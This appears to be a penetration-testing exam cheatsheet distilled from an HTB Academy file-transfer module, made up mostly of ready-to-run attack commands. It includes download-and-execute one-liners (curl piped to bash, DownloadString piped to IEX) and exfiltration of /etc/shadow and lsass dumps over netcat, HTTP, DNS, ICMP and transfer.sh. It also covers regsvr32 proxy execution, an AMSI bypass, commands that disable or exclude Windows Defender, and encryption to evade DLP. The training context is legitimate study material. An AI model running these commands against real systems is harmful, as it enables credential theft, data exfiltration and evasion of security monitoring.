# File Transfers — Exam Cheatsheet

**Distilled from HTB Academy "File Transfers" module.** Open this during the exam.

---

## Decision Tree (pick the right method fast)

```
Have shell on target?
├─ NO  → land file via exploit (RFI/SQLi INTO OUTFILE/SMB upload/FTP put)
└─ YES → which way?
   ├─ Pull (target → fetches from you)  ← preferred
   │  ├─ Linux:    wget / curl / bash /dev/tcp / scp / nc
   │  └─ Windows:  certutil / IWR / WebClient / bitsadmin / curl.exe
   ├─ Push (you → target)
   │  ├─ scp / sftp / smbclient put / FTP put / nc < file
   └─ Out-of-band: paste base64 / DNS exfil / ICMP / SMB share
Detected by AV/EDR?
   → encrypt (gpg/openssl) + rename + chunk + obfuscate (base64)
   → use LOLBin (certutil/bitsadmin/Add-MpPreference exclusion)
```

---

## Stage 0 — Always-On Attacker Servers

```bash
# HTTP (Python — universal)
sudo python3 -m http.server 80
# HTTPS
python3 -m http.server 443 --bind 0.0.0.0
# Upload-capable HTTP (uploadserver)
pip install uploadserver && python3 -m uploadserver 80

# WebDAV (PUT support — Windows IWR/Net Use writes)
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# SMB share (Windows can `copy \\IP\share\file`)
impacket-smbserver share /tmp -smb2support
impacket-smbserver share /tmp -smb2support -username U -password P

# FTP
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write

# TFTP (UDP 69 — old Windows)
sudo apt install atftpd
sudo atftpd --daemon --port 69 /tmp

# Netcat
nc -lnvp 8000 > received_file
nc -lnvp 8000 < file_to_send
```
> Start one of these on your attacker machine before transferring anything. `python3 -m http.server 80` serves files from the current directory over HTTP on port 80. `uploadserver` also accepts POST uploads. `impacket-smbserver` creates a writable Windows-accessible SMB share — add `-username/-password` if the target blocks anonymous SMB. `pyftpdlib --write` enables FTP uploads from the target. `--bind 0.0.0.0` ensures the server listens on all interfaces, not just loopback.

---

## Linux Target — DOWNLOAD (target pulls from you)

```bash
# wget / curl — most universal
wget http://10.10.14.X/file -O /tmp/file
curl -o /tmp/file http://10.10.14.X/file
curl -fsSL http://10.10.14.X/script.sh | bash

# bash built-in (no curl/wget present)
exec 3<>/dev/tcp/10.10.14.X/80
echo -e "GET /file HTTP/1.1\r\nHost: 10.10.14.X\r\n\r\n" >&3
cat <&3 > /tmp/file

# scp from attacker
scp user@10.10.14.X:/tmp/file /tmp/file

# SSH single-line
ssh user@10.10.14.X "cat /file" > /tmp/file

# Python fallback
python3 -c "import urllib.request;urllib.request.urlretrieve('http://10.10.14.X/f','/tmp/f')"

# nc receive
nc -lvnp 4444 > /tmp/file        # on target
nc -w3 TARGET 4444 < file        # on attacker
```
> Replace `10.10.14.X` with your attacker IP. `-O` on wget saves with a specific filename. The `/dev/tcp` trick works without wget or curl — it opens a raw TCP connection through bash's built-in network device. The Python fallback works on any system with Python 3. For nc: start the listener on the target first, then push the file from the attacker with `-w3` (3-second timeout after EOF).

## Linux Target — UPLOAD (push out)

```bash
# Reverse via attacker nc
# attacker:  nc -lvnp 4444 > out.bin
# target:    nc -w3 ATTACKER 4444 < /etc/shadow

# curl PUT (to your uploadserver / WebDAV)
curl -T /etc/shadow http://10.10.14.X/

# scp out
scp /etc/shadow user@10.10.14.X:/loot/

# Inline base64 paste (small files)
base64 -w0 /etc/shadow              # copy → paste into terminal on attacker
```
> `curl -T` sends a PUT request to upload a file to your waiting uploadserver or WebDAV server. `-w0` on base64 disables line wrapping so the output is one continuous string — paste it into a text editor on the attacker and decode with `base64 -d`. Good for small files like `/etc/shadow` when HTTP is blocked. Replace the IP with your attacker address.

---

## Windows Target — DOWNLOAD

### PowerShell (5+)
```powershell
# Invoke-WebRequest (alias: iwr, wget, curl)
IWR -Uri http://10.10.14.X/file.exe -OutFile C:\Windows\Temp\file.exe -UseBasicParsing
(New-Object Net.WebClient).DownloadFile('http://10.10.14.X/f.exe','C:\Temp\f.exe')
(New-Object Net.WebClient).DownloadString('http://10.10.14.X/r.ps1') | IEX
IEX(IWR -UseBasicParsing http://10.10.14.X/r.ps1)

# Force TLS 1.2 (older Windows)
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
# Skip cert check
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
```
> `Invoke-WebRequest` (IWR) is the standard PowerShell download method. `-UseBasicParsing` avoids errors when Internet Explorer is not initialized. `DownloadString | IEX` downloads and executes a script in memory without writing to disk — useful for evading disk-based AV. Force TLS 1.2 if you get protocol errors on older Windows. The cert callback override skips SSL certificate validation for self-signed HTTPS servers.

### CMD / LOLBins
```cmd
:: certutil (always present, EDR loud)
certutil -urlcache -split -f http://10.10.14.X/f.exe C:\Temp\f.exe
certutil -verifyctl -split -f http://10.10.14.X/f.exe

:: bitsadmin
bitsadmin /transfer wcb /priority foreground http://10.10.14.X/f.exe C:\Temp\f.exe

:: curl.exe (Win10 1803+)
curl.exe http://10.10.14.X/f.exe -o C:\Temp\f.exe

:: SMB copy (run impacket-smbserver on attacker)
copy \\10.10.14.X\share\f.exe C:\Temp\f.exe
xcopy /E \\10.10.14.X\share C:\Temp\

:: WebDAV via NET USE
net use Z: \\10.10.14.X\DavWWWRoot /persistent:no
copy Z:\f.exe C:\Temp\f.exe
```
> `certutil -urlcache` is on every Windows system but is heavily logged by EDR tools — rename it or use `-verifyctl` variant to reduce signature hits. `bitsadmin` runs as a Background Intelligent Transfer Service (BITS) job — lower noise. `xcopy /E` copies recursively. `net use Z:` mounts your WebDAV share as a drive letter — requires `wsgidav` running on the attacker. Replace `10.10.14.X` with your attacker IP throughout.

### Living-off-the-Land (signed binaries that download)
| Binary | Cmd |
|--------|-----|
| certutil | `certutil -urlcache -f URL out` |
| bitsadmin | `bitsadmin /transfer x URL out` |
| Wmic | `wmic process call create "powershell -c IWR URL -OutFile out"` |
| MpCmdRun | `MpCmdRun.exe -DownloadFile -url URL -path out`  (Defender!) |
| Esentutl | `esentutl.exe /y src /d dst /o` |
| PrintBrm | `PrintBrm -B -F file.bin -S \\IP\share` |
| Finger | `finger user@IP | findstr ...`  (super stealthy) |
| Regsvr32 | `regsvr32 /s /n /u /i:http://IP/file.sct scrobj.dll` (proxy exec) |

## Windows Target — UPLOAD

```powershell
# IWR PUT (to WebDAV / uploadserver)
IWR -Uri http://10.10.14.X/loot.zip -Method PUT -InFile C:\Temp\loot.zip
(New-Object Net.WebClient).UploadFile('http://10.10.14.X/x','C:\Temp\loot.zip')

# SMB push
copy C:\Temp\loot.zip \\10.10.14.X\share\

# base64 paste-out for small files (under ~5MB)
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\file.bin')) | clip
# or stream over WinRM:
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\file.bin')); $b64
```
> `IWR -Method PUT` uploads a file to your waiting uploadserver or WebDAV server. `| clip` copies the base64 string to the Windows clipboard — paste it into your terminal on the attacker machine and decode with `base64 -d`. The WinRM streaming variant prints the string directly if clipboard is unavailable. Replace the IP and path for your target.

> **Skills26 pattern (memorize):** When SMB is firewalled, exfil via WinRM:
> ```
> Compress-Archive C:\Temp\lsass.dmp lsass.zip
> $bytes=[IO.File]::ReadAllBytes('lsass.zip')
> # Loop 2 MB chunks → [Convert]::ToBase64String → print → reassemble locally
> ```

---

## With Code — Language Built-ins

```bash
# Python
python3 -c "import urllib.request as u; u.urlretrieve('URL','out')"
python3 -c "import http.server,socketserver as s; s.TCPServer(('',8000),http.server.SimpleHTTPRequestHandler).serve_forever()"

# PHP
php -S 0.0.0.0:80                                       # serve
php -r '$f=file_get_contents("URL"); file_put_contents("out",$f);'

# Ruby
ruby -run -ehttpd . -p8000                              # serve
ruby -e 'require "open-uri"; IO.write("out", URI.open("URL").read)'

# Perl
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("ATTACKER:80"); print $s "GET /f HTTP/1.0\r\n\r\n"; ($_)=<$s>; ...'

# Node
node -e "require('https').get('URL',r=>r.pipe(require('fs').createWriteStream('out')))"

# Java
jrunscript -e "var s=new java.io.BufferedInputStream(new java.net.URL('URL').openStream());..."
```
> Use whichever language runtime is available on the target. Python and PHP are the most common. The Python `http.server` one-liner starts a file server from the current directory — useful when you need to serve files without a separate server process. Replace `URL` with your attacker's HTTP server URL and `out` with the output filename.

---

## Out-of-Band / Stealthy Channels

```bash
# DNS exfil (small data)
# attacker (named/dnsmasq logs)
sudo tcpdump -i tun0 -n udp port 53 -A
# target
for c in $(base64 secret | fold -w 30); do dig $c.attacker.tld +short; done

# ICMP exfil
hping3 -1 -E secret -d 100 ATTACKER
# attacker
sudo tcpdump -i tun0 -n icmp -X

# Cloud drop (when target has internet)
curl -F "file=@/tmp/loot.zip" https://transfer.sh/x
curl --upload-file /tmp/loot.zip https://transfer.sh/loot.zip
```
> DNS exfil encodes data in subdomain labels and sends DNS queries to your attacker-controlled domain — captured by `tcpdump` on the tun0 interface. `fold -w 30` splits base64 into 30-character chunks that fit in a subdomain label. ICMP exfil embeds file data in ICMP ping payloads using `hping3`. Use cloud drop as a last resort when direct connectivity to your attacker is blocked but the target has outbound internet access.

---

## Encryption / Obfuscation (evade DLP)

```bash
# Pre-encrypt before transfer
gpg -c file.bin                              # symmetric, password
openssl enc -aes-256-cbc -salt -in f -out f.enc -k PASS
openssl enc -d -aes-256-cbc -in f.enc -out f -k PASS

# Quick zip with password
7z a -p'PASS' -mhe=on out.7z file
zip -e out.zip file                          # weak — burnable
```
> Encrypt files before transferring to evade Data Loss Prevention (DLP) and content-inspection proxies. `gpg -c` uses symmetric encryption with a passphrase. `openssl enc -aes-256-cbc` is cross-platform. `-d` decrypts. `-k PASS` sets the passphrase. `7z -mhe=on` also encrypts the filename headers, not just the content. `zip -e` uses ZIP encryption which is weak and easily cracked.

---

## Catching Files over HTTP(S)

```python
# uploadserver — HTTP POST drop
pip install uploadserver
python3 -m uploadserver 8000
# Target:
curl -F "files=@/etc/shadow" http://ATTACKER:8000/upload
```
> `uploadserver` extends Python's built-in HTTP server with a `/upload` POST endpoint. Start it on your attacker machine, then use `curl -F` from the target to POST the file. Replace `ATTACKER` with your attacker IP.

```bash
# nginx PUT-receive (snippet)
server {
  listen 80;
  client_max_body_size 0;
  location / { dav_methods PUT DELETE MKCOL COPY MOVE; create_full_put_path on; root /tmp/upload; }
}
```
> nginx WebDAV config snippet — enables HTTP PUT uploads to `/tmp/upload/`. `client_max_body_size 0` removes the upload size limit. Use this when you need a production-grade receiver instead of uploadserver. Add this to an nginx server block and reload nginx.

---

## Detection / Evasion (§9, §10)

| Method | Risk | Notes |
|--------|------|-------|
| `certutil` | High — Sysmon ID 1, AMSI logs | rename to `cu.exe`, use `-VerifyCtl` |
| PowerShell `IWR` | Medium — ScriptBlock logging | use `-UseBasicParsing`, no aliases |
| `BITS` | Low | survives reboot, async |
| SMB | Medium | Sysmon ID 3 outbound 445 |
| `regsvr32 /i:URL` | Medium | classic Squiblydoo |
| `wmic process call create` | High — Defender flags | obfuscate args |
| HTTPS with valid cert | Low | use Let's Encrypt domain |
| DNS over UDP/53 | Very low | rate-limit yourself |

### Quick AMSI bypass (PowerShell, ephemeral session)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
> Anti-Malware Scan Interface (AMSI) bypass — sets the internal `amsiInitFailed` flag to `$true` using reflection. This prevents AMSI from scanning subsequent PowerShell commands in the current session. Only effective within the same PowerShell process. Requires no special privileges.

### Defender exclusion (if local admin)
```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true   # noisy alert
```
> Adds `C:\Temp` to Windows Defender's exclusion list so files dropped there are not scanned. `-DisableRealtimeMonitoring` turns off real-time protection entirely — very noisy and likely to trigger alerts. Use the exclusion path approach instead when possible. Requires local administrator privileges.

---

## Verify After Transfer

```bash
md5sum file                                  # Linux
sha256sum file
```
> Generates the MD5 or SHA-256 hash of a file. Run this on both sides (attacker and target) after a transfer to verify the file arrived intact and was not corrupted or tampered with during transit.

```powershell
Get-FileHash file -Algorithm SHA256          # Windows
certutil -hashfile file SHA256
```
> Windows equivalent of `sha256sum`. `Get-FileHash` is the PowerShell cmdlet; `certutil -hashfile` works from CMD. Compare the output to the hash on your attacker machine to verify file integrity.

---

## STUCK? Triage

| Symptom | Fix |
|---------|-----|
| `wget` not present | use `curl`, then `bash /dev/tcp`, then `python3` |
| Windows TLS error on IWR | force TLS 1.2; bypass cert callback |
| `certutil` blocked / 0 bytes | use `bitsadmin /transfer` or copy `\\IP\share\f` |
| Defender deletes file mid-write | use SMB share, or encrypt+rename, or split chunks |
| Nc not on Windows | use PS reverse `(New-Object Net.WebClient).DownloadFile` |
| Tx kills shell | use `nohup`/`Start-Process`, or chunk `dd bs=1M count=1` |
| Path has spaces/Unicode | quote (`"`) and escape `\\` in cmd; single-quote outer in zsh |
| Webserver works locally but target can't reach | listening on `127.0.0.1` not `0.0.0.0`; firewall on attacker (`sudo ufw allow 80`) |
| 0-byte file landed | check `Content-Length`; pull HTTPS not HTTP if proxy strips |

---

## Quick Reference Matrix

| Target → Direction | Linux | Windows |
|---|---|---|
| Pull HTTP | `wget`/`curl`/`/dev/tcp` | `IWR`/`certutil`/`curl.exe`/`bitsadmin` |
| Pull SMB | `smbclient //IP/s -c get` | `copy \\IP\s\f .` |
| Pull FTP | `curl ftp://` | `curl.exe ftp://` / FTP CMD |
| Push HTTP | `curl -T` | `IWR -Method PUT` / `Net.WebClient.UploadFile` |
| Push SMB | `smbclient -c put` | `copy f \\IP\s\` |
| Quiet OOB | DNS / ICMP | DNS / ICMP / WinRM base64 chunks |

---

## References

- Section files: [02-Windows_File_Transfer_Methods_Downloads.md](02-Windows_File_Transfer_Methods_Downloads.md), [03-Linux_File_Transfer_Methods.md](03-Linux_File_Transfer_Methods.md), [04-Transferring_Files_with_Code.md](04-Transferring_Files_with_Code.md), [05-Miscellaneous_File_Transfer_Methods.md](05-Miscellaneous_File_Transfer_Methods.md), [06-Protected_File_Transfers.md](06-Protected_File_Transfers.md), [07-Catching_Files_over_HTTP_S.md](07-Catching_Files_over_HTTP_S.md), [08-Living_off_the_Land.md](08-Living_off_the_Land.md), [09-Detection.md](09-Detection.md), [10-Evading_Detection.md](10-Evading_Detection.md)
